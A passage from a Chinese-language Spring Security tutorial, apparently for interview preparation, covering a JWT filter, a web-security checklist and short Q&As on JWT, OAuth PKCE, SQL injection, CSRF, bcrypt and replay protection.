            try {
                Claims claims = Jwts.parser().setSigningKey(secretKey)
                    .parseClaimsJws(header.substring(7)).getBody();
                UsernamePasswordAuthenticationToken auth =
                    new UsernamePasswordAuthenticationToken(claims.getSubject(), null,
                        extractAuthorities(claims));
                SecurityContextHolder.getContext().setAuthentication(auth);
            } catch (ExpiredJwtException e) {
                log.warn("JWT 已过期: {}", e.getMessage());
            } catch (JwtException e) {
                log.warn("JWT 无效: {}", e.getMessage());
            }
        }
        chain.doFilter(request, response);
    }
}
```

**配置要点**：JWT Filter 必须放在认证 Filter 之前执行；401 vs 403 在响应中准确区分（401 跳登录，403 跳无权限页）；安全响应头（CSP、HSTS、X-Frame-Options）成本极低务必开启。

---

## 六、安全 Checklist

**认证**：Bcrypt/Argon2 cost ≥ 10 | JWT RS256 或 HS256 + 强 secret | Access Token ≤ 15min + Refresh Token 黑名单 | OAuth 授权码 + PKCE | 关键操作开 MFA/TOTP

**授权**：每个 API 声明所需权限 | 数据访问以当前用户 ID 过滤（不信任前端传的 ID）| RBAC 为主 ABAC 补充

**防漏洞**：SQL 100% 参数化（`#{}`，`${}` 加白名单）| 输出编码 + CSP + HttpOnly 防 XSS | Cookie SameSite=Lax + Secure + HttpOnly | 非 JWT 场景 CSRF Token | SSRF URL 白名单 + 内网 IP 过滤 | 文件上传多维校验（Magic Number/存储隔离/目录无执行权限）| 接口+数据双重权限校验（防越权）

**运维安全**：全站 HTTPS + HSTS | 敏感数据不入日志（toString() 排除密码）| 数据库无 DDL 账号隔离 | 网关+应用层双重限流 | 对外 API HMAC 签名 + Nonce + 时间戳防重放 | 安全响应头完整配置

---

## 面试高频追问速记

**1. "JWT 怎么实现退出登录？"** → 短 Access Token + Refresh Token 黑名单。本质是拿空间换时间——不让 Access Token 活太久。

**2. "OAuth 2.0 隐式模式为什么废弃？"** → Token 暴露在 URL fragment 无 client_secret 校验。PKCE 取代，非对称方式确保安全。

**3. "MyBatis `#{}` 和 `${}` 的底层区别？"** → `#{}` 走 PreparedStatement（解耦 SQL 与数据），`${}` 走 Statement（拼接后整条发送无法区分代码与数据）。

**4. "CSRF Token 为什么能防 CSRF？"** → 攻击者跨站发起请求时，同源策略阻止其读取目标站点页面内容，拿不到 Token 值。

**5. "Bcrypt 为什么比 SHA256 适合存密码？"** → SHA256 设计目标是快（完整性校验），Bcrypt 故意慢（cost factor），且内存访问模式对硬件加速不友好。

**6. "怎么防止水平越权？"** → 不信任前端传来的用户 ID，数据查询必须从 `SecurityContextHolder` 获取当前用户作为过滤条件。

**7. "API 签名为什么要加 Nonce？"** → Timestamp 只能防过期重放，Nonce 保证同一时间窗口内每条请求唯一。两者配合才能彻底防重放。

**8. "为什么 Symmetric（HS256）JWT 不推荐用于微服务？"** → 所有服务共享同一把密钥，任何一个服务密钥泄露就能伪造所有服务的 JWT。RS256 用私钥签名公钥验证，即使公钥泄露无法伪造。
